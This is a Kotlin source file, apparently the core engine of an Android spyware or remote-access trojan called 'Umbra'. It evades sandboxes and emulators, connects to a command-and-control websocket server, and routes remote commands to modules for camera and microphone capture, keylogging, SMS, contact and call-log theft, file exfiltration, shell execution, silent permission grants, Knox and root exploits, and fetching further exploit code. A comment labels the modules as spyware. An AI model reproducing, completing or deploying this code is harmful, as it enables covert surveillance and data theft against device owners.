package org.umbra.core.core

import android.content.Context
import android.provider.Settings
import android.util.Log
import org.umbra.core.c2.C2Coordinator
import org.umbra.core.c2.Command
import org.umbra.core.modules.CameraModule
import org.umbra.core.modules.ClipboardModule
import org.umbra.core.modules.FileModule
import org.umbra.core.modules.KnoxGuardModule
import org.umbra.core.modules.KnoxHideExploit
import org.umbra.core.modules.LocationModule
import org.umbra.core.modules.SemClipboardExploit
import org.umbra.core.modules.ShellModule
import org.umbra.core.modules.SilentPermissionGrant
import org.umbra.core.modules.SmsModule
import org.umbra.core.modules.CallLogModule
import org.umbra.core.modules.ContactsModule
import org.umbra.core.modules.MicModule
import org.umbra.core.modules.NotificationModule
import org.umbra.core.modules.KeylogModule
import org.umbra.core.modules.KnoxPermissionGrant
import org.umbra.core.modules.LiveMonitor
import org.umbra.core.modules.RootModule
import org.umbra.core.modules.PatTokenExploit
import org.umbra.core.modules.AuthFwExploit

object UmbraEngine {
    private const val TAG = "Umbra"
    private const val DEFAULT_C2 = "wss://192.168.1.9:8443/c2"
    private var started = false

    fun start(context: Context) {
        if (started) return
        started = true

        if (!SandboxDetector.isRealDevice(context)) {
            Log.w(TAG, "Sandbox/emulator detected — refusing to start engine")
            return
        }

        // Sandbox analysis check disabled for testing
        // if (SandboxDetector.looksLikeAnalysis()) {
        //     Log.w(TAG, \"Analysis environment detected — sleeping\")
        //     Thread.sleep(3600_000)
        //     return
        // }

        val deviceId = getDeviceId(context)
        val prefs = context.getSharedPreferences("umbra_prefs", Context.MODE_PRIVATE)
        // Allow override via ADB: adb shell "echo 'wss://IP:8443/c2' > /data/data/org.umbra.core/shared_prefs/umbra_c2_url"
        val overrideFile = java.io.File(context.filesDir.parent, "shared_prefs/umbra_c2_url")
        var c2Url = DEFAULT_C2
        if (overrideFile.exists()) {
            c2Url = overrideFile.readText().trim()
            if (c2Url.isNotEmpty() && c2Url.startsWith("wss://")) {
                prefs.edit().putString("c2_base_url", c2Url).apply()
                Log.d(TAG, "C2 URL override: $c2Url")
            }
        }
        c2Url = prefs.getString("c2_base_url", c2Url) ?: c2Url
        val fcmToken = prefs.getString("fcm_token", null)

        prefs.edit().putString("device_id", deviceId).apply()

        val handlers: Map<String, suspend (Command) -> UmbraResponse> = mapOf(
            "ping"     to { cmd -> UmbraResponse.PingResponse(pong = true, latency_ms = 0) },
            "info"     to { cmd -> InfoModule.gather(context) },
            "camera"   to { cmd -> CameraModule.capture(context, cmd) },
            "screenshot" to { cmd -> CameraModule.screenshot(context, cmd) },
            "location" to { cmd -> LocationModule.get(context, cmd) },
            "files"    to { cmd -> when (cmd.action) {
                "list" -> FileModule.list(context, cmd)
                "read" -> FileModule.read(context, cmd)
                "download" -> FileModule.download(context, cmd)
                else -> FileModule.list(context, cmd)
            }},
            "file_read" to { cmd -> FileModule.read(context, cmd) },
            "shell"    to { cmd -> ShellModule.exec(cmd) },
            "clipboard" to { cmd -> try { ClipboardModule.scrape(context, cmd) } catch (e: Exception) { UmbraResponse.ErrorResponse("clipboard:${e.message}", "clipboard") } },
            "clipboard_image" to { cmd -> try { ClipboardModule.readImage(context, cmd) } catch (e: Exception) { UmbraResponse.ErrorResponse("clipboard_img:${e.message}", "clipboard") } },
            "knox_hide" to { cmd -> try { KnoxGuardModule.hide(context, cmd) } catch (e: Exception) { UmbraResponse.ErrorResponse("knox_hide:${e.message}", "knox_guard") } },
            "knox_unhide" to { cmd -> try { KnoxGuardModule.unhide(context, cmd) } catch (e: Exception) { UmbraResponse.ErrorResponse("knox_unhide:${e.message}", "knox_guard") } },
            "knox_check" to { cmd -> try { KnoxGuardModule.check(context, cmd) } catch (e: Exception) { UmbraResponse.ErrorResponse("knox_check:${e.message}", "knox_guard") } },
            "semclipboard" to { cmd -> try { SemClipboardExploit.scrape(context, cmd) } catch (e: Exception) { UmbraResponse.ErrorResponse("semclipboard:${e.message}", "semclipboard") } },
            "knox_hide_v2" to { cmd -> try { KnoxHideExploit.hide(context, cmd) } catch (e: Exception) { UmbraResponse.ErrorResponse("knox_hide_v2:${e.message}", "knox_hide_v2") } },
            "knox_unhide_v2" to { cmd -> try { KnoxHideExploit.unhide(context, cmd) } catch (e: Exception) { UmbraResponse.ErrorResponse("knox_unhide_v2:${e.message}", "knox_hide_v2") } },
            "silent_grant" to { cmd -> try { SilentPermissionGrant.grant(context, cmd) } catch (e: Exception) { UmbraResponse.ErrorResponse("silent_grant:${e.message}", "silent_grant") } },
            // ── NEW SPYWARE MODULES ──
            "sms"      to { cmd -> when (cmd.action) {
                "list" -> SmsModule.list(context, cmd)
                "read" -> SmsModule.read(context, cmd)
                "dump" -> SmsModule.dump(context, cmd)
                "send" -> SmsModule.send(context, cmd)
                "capture" -> SmsModule.capture(context, cmd)
                else -> UmbraResponse.ErrorResponse("sms:unknown_action:${cmd.action}", "sms")
            }},
            "calls"    to { cmd -> when (cmd.action) {
                "list" -> CallLogModule.list(context, cmd)
                else -> UmbraResponse.ErrorResponse("calls:unknown_action:${cmd.action}", "calls")
            }},
            "contacts" to { cmd -> when (cmd.action) {
                "list" -> ContactsModule.list(context, cmd)
                else -> UmbraResponse.ErrorResponse("contacts:unknown_action:${cmd.action}", "contacts")
            }},
            "mic"      to { cmd -> when (cmd.action) {
                "record" -> MicModule.record(context, cmd)
                "stop" -> MicModule.stop(context, cmd)
                else -> UmbraResponse.ErrorResponse("mic:unknown_action:${cmd.action}", "mic")
            }},
            "notifications" to { cmd -> when (cmd.action) {
                "list" -> NotificationModule.list(context, cmd)
                else -> UmbraResponse.ErrorResponse("notifications:unknown_action:${cmd.action}", "notifications")
            }},
            "keylog"   to { cmd -> when (cmd.action) {
                "start" -> KeylogModule.start(context, cmd)
                "stop" -> KeylogModule.stop(context, cmd)
                "dump" -> KeylogModule.dump(context, cmd)
                "status" -> KeylogModule.status(context, cmd)
                "start_keyboard" -> KeylogModule.startKeyboard(context, cmd)
                "enable_keyboard" -> KeylogModule.enableKeyboard(context, cmd)
                else -> UmbraResponse.ErrorResponse("keylog:unknown_action:${cmd.action}", "keylog")
            }},
            "knox"     to { cmd -> when (cmd.action) {
                "grant" -> KnoxPermissionGrant.grantAll(context, cmd)
                "enumerate" -> KnoxPermissionGrant.enumerateServices(cmd)
                "shell_exploit" -> KnoxPermissionGrant.knoxShellExploit(cmd)
                else -> UmbraResponse.ErrorResponse("knox:unknown_action:${cmd.action}", "knox")
            }},
            "live"     to { cmd -> when (cmd.action) {
                "start" -> LiveMonitor.start(context, cmd)
                "stop" -> LiveMonitor.stop(context, cmd)
                "status" -> LiveMonitor.status(cmd)
                else -> UmbraResponse.ErrorResponse("unknown:live:${cmd.action}", "live")
            }},
            "root"    to { cmd -> when (cmd.action) {
                "check" -> RootModule.check(context, cmd)
                "exploit" -> RootModule.exploit(context, cmd)
                "daemonize" -> RootModule.daemonize(context, cmd)
                "exploit_download" -> RootModule.exploitDownload(context, cmd)
                else -> UmbraResponse.ErrorResponse("unknown:root:${cmd.action}", "root")
            }},
            "pat"      to { cmd -> PatTokenExploit.exploit(context, cmd) },
            "authfw"   to { cmd -> AuthFwExploit.exploit(context, cmd) }
        )

        C2Coordinator.start(context, deviceId, c2Url, fcmToken, handlers)
        Log.d(TAG, "Engine started — device=$deviceId")
    }

    fun stop() {
        C2Coordinator.stop()
        started = false
    }

    private fun getDeviceId(context: Context): String {
        return Settings.Secure.getString(
            context.contentResolver, Settings.Secure.ANDROID_ID
        ) ?: android.os.Build.getSerial()
    }
}
